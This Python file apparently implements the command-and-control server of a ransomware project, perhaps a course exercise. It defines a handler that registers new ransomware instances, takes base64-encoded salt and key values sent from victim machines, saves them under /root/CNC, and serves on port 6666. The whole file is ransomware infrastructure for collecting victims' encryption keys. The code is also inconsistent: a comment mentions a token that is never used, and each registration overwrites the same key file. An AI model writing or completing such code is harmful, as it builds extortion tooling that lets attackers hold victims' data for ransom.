import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase


class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])
        #Saving the salt, key and token from url
        with open(os.path.join(self.ROOT_PATH, "salt.bin"), "wb") as x:
            x.write(salt)
        with open(os.path.join(self.ROOT_PATH, "key.bin"), "wb") as x:
            x.write(key)
        

        return {"status":"KO"}
           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()